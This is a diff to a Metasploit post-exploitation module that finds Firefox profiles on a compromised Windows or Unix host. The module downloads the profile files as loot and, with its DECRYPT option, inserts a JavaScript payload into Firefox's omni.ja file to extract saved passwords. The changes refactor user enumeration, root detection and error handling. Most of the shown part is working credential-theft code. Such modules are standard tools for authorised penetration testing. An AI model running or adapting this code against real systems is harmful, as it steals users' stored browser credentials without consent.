@@ -176,9 +176,9 @@ class Metasploit3 < Msf::Post
       decrypt_download_creds
     else  # Non DECRYPT
       paths = []
-      @platform =~ /unix|osx/ ? (paths = enum_users_unix) : (paths = enum_users_win)
+      paths = enum_users
 
-      if paths.empty?
+      if paths.nil? or paths.empty?
         print_error("No users found with a Firefox directory")
         return
       end
@@ -228,63 +228,54 @@ class Metasploit3 < Msf::Post
   end
 
 
-  def enum_users_unix
+  def enum_users
     paths = []
     id = whoami
+
     if id.nil? or id.empty?
       print_error("Session #{datastore['SESSION']} is not responding")
       return
     end
 
-    @platform == :osx ? (home = "/Users/") : (home = "/home/")
+    if @platform == :windows
+      vprint_status("Searching every possible account on the target system")
+      grab_user_profiles().each do |user|
+        next if user['AppData'].nil?
+        dir = check_firefox_win(user['AppData'])
+        paths << dir if dir
+      end
+    else   # unix, bsd, linux, osx
+      @platform == :osx ? (home = "/Users/") : (home = "/home/")
 
-    if got_root?
-      vprint_status("Detected ROOT privileges. Searching every account on the system.")
-      userdirs = session.shell_command("ls #{home} 2>/dev/null").gsub(/\s/, "\n")
-      userdirs << "/root\n"
-    else
-      vprint_status("Checking #{id}'s Firefox account")
-      userdirs = session.shell_command("ls #{home + id} 2>/dev/null").gsub(/\s/, "\n")
-    end
+      if got_root
+        vprint_status("Detected ROOT privileges. Searching every account on the target system.")
+        userdirs = cmd_exec("find #{home} -maxdepth 1 -mindepth 1 2>/dev/null").gsub(/\s/, "\n")
+        userdirs << "/root\n"
+      else
+        vprint_status("Checking #{id}'s Firefox account")
+        userdirs = "#{home + id}\n"
+      end
 
-    userdirs.each_line do |dir|
-      dir.chomp!
-      next if dir == "." || dir == ".." || dir =~ /No such file/i
+      userdirs.each_line do |dir|
+        dir.chomp!
+        next if dir == "." or dir == ".." or dir =~ /No such file/i
 
-      dir =~ /^\/root$/ ? (basepath = "/#{id}") : (basepath = "#{home + dir}")
-      @platform == :osx ? (basepath = "#{basepath}/Library/Application\\ Support/Firefox/Profiles/") : (basepath = "#{basepath}/.mozilla/firefox/")
+        @platform == :osx ? (basepath = "#{dir}/Library/Application\\ Support/Firefox/Profiles/") : (basepath = "#{dir}/.mozilla/firefox/")
 
-      print_status("Checking for Firefox profile in: #{basepath}")
-      checkpath = session.shell_command("ls #{basepath} 2>/dev/null").gsub(/\s/, "\n")
-      checkpath.each_line do |ffpath|
-        ffpath.chomp!
-        if ffpath =~ /\.default/
-          vprint_good("Found profile: #{basepath + ffpath}")
-          paths << "#{basepath + ffpath}"
+        print_status("Checking for Firefox profile in: #{basepath}")
+        checkpath = cmd_exec("ls #{basepath}").gsub(/\s/, "\n")
+
+        checkpath.each_line do |ffpath|
+          ffpath.chomp!
+          if ffpath =~ /\.default/
+            vprint_good("Found profile: #{basepath + ffpath}")
+            paths << "#{basepath + ffpath}"
+          end
         end
       end
     end
-  return paths
-  end
-
-
-  def enum_users_win
-    paths = []
-    id = whoami
-    if id.nil? or id.empty?
-      print_error("Session #{datastore['SESSION']} is not responding")
-      return
-    end
-
-    vprint_status("Searching every possible account on the system")
-    grab_user_profiles().each do |user|
-      next if user['AppData'].nil?
-      dir = check_firefox_win(user['AppData'])
-      paths << dir if dir
-    end
     return paths
   end
-
 
   def check_firefox_win(path)
     paths  = []
@@ -310,7 +301,7 @@ class Metasploit3 < Msf::Post
     end
 
     #print_status("Locating Firefox profiles")
-    path += "Firefox\\Profiles\\"
+    path << "Firefox\\Profiles\\"
 
     # We should only have profiles in the Profiles directory store them all
     begin
@@ -341,7 +332,7 @@ class Metasploit3 < Msf::Post
       profile = path.scan(/Profiles[\\|\/](.+)\.(.+)$/).flatten[0].to_s
       profile = path.scan(/firefox[\\|\/](.+)\.(.+)$/).flatten[0].to_s if profile.empty?
 
-      session.type == "meterpreter" ? (files = session.fs.dir.foreach(path)) : (files = session.shell_command("ls #{path} 2>/dev/null").split())
+      session.type == "meterpreter" ? (files = session.fs.dir.foreach(path)) : (files = cmd_exec("ls #{path} 2>/dev/null").split())
 
       files.each do |file|
         file.chomp!
@@ -349,11 +340,11 @@ class Metasploit3 < Msf::Post
           ext = file.split('.')[2]
           ext == "txt" ? (mime = "plain") : (mime = "binary")
           vprint_status("Downloading: #{file}")
-          if session.type == "meterpreter"
+          if @platform == :windows
             p = store_loot("ff.#{profile}.#{file}", "#{mime}/#{ext}", session, "firefox_#{file}")
             session.fs.file.download_file(p, path + "\\" + file)
           else   # windows has to be meterpreter, so can be anything else (unix, bsd, linux, osx)
-            loot = session.shell_command("cat #{path + file}")
+            loot = cmd_exec("cat #{path}//#{file}")
             p = store_loot("ff.#{profile}.#{file}", "#{mime}/#{ext}", session, loot, "firefox_#{file}", "#{file} for #{profile}")
           end
           print_good("Downloaded #{file}: #{p.to_s}")
@@ -372,7 +363,7 @@ class Metasploit3 < Msf::Post
 
     case @platform
     when /win/
-      if !got_root? and session.sys.config.sysinfo['OS'] !~ /xp/i
+      if !got_root and session.sys.config.sysinfo['OS'] !~ /xp/i
         print_warning("You may need SYSTEM privileges on this platform for the DECRYPT option to work")
       end
 
@@ -384,8 +375,8 @@ class Metasploit3 < Msf::Post
       check_paths << drive + '\\Program Files\\Mozilla Firefox\\'
       check_paths << drive + '\\Program Files (x86)\\Mozilla Firefox\\'
     when /unix/
-      if cmd_exec("whoami").chomp !~ /root/
-        print_error("You need root privileges on this platform for DECRYPT option")
+      if !got_root
+        print_error("You need ROOT privileges on this platform for DECRYPT option")
         return false
       end
       # Unix matches linux|unix|bsd but BSD is not supported
@@ -436,19 +427,25 @@ class Metasploit3 < Msf::Post
               'jsloader/resource/gre/components/storage-mozStorage.js'   # res_js (not 100% sure why this is used)
             ]
 
-    # Extract files
-    arya = files.map do |file|
+    # Extract files from zip
+    arya = files.map do |omnija_file|
       fdata = {}
-      fdata['content'] = zip.read(file) unless file =~ /jsloader/
-      fdata['outs'] = zip.get_output_stream(file)
+      begin
+        fdata['content'] = zip.read(omnija_file) unless omnija_file =~ /jsloader/
+        fdata['outs'] = zip.get_output_stream(omnija_file)
+      rescue
+        print_error("Was not able to find '#{omnija_file}' in the compressed .JA file")
+        print_error("This could be due to a corrupt download or a unsupported Firefox/Iceweasel version")
+        return false
+      end
       fdata
     end
 
-    # Read contents
+    # Read contents of array (arya)
     stor_js, pwd_xul, dlog_xul, res_js = arya
     stor_js['outs_res'] = res_js['outs']
 
-    # Payload (close after starting up - allowing evil js to run and nothing else)
+    # Insert payload (close after starting up - allowing evil js to run and nothing else)
     wnd_close = "window.close();"
     onload = "Startup(); SignonsStartup(); #{wnd_close}"
 
@@ -708,18 +705,18 @@ Components.utils.import("resource://gre/modules/XPCOMUtils.jsm");
   end
 
 
-  def got_root?
+  def got_root
     case @platform
     when :windows
-      session.sys.config.getuid =~ /SYSTEM/ ? (true) : (false)
+      session.sys.config.getuid =~ /SYSTEM/ ? true : false
     else   # unix, bsd, linux, osx
-      ret = whoami
-      ret =~ /root/ ? (true) : (false)
+      id_output = cmd_exec("id").chomp
+      id_output.include?("uid=0(") ? true : false
     end
   end
 
 
   def whoami
-    @platform == :windows ? (session.sys.config.getenv('USERNAME')) : (session.shell_command("whoami").chomp)
+    @platform == :windows ? (session.sys.config.getenv('USERNAME')) : (cmd_exec("whoami").chomp)
   end
 end
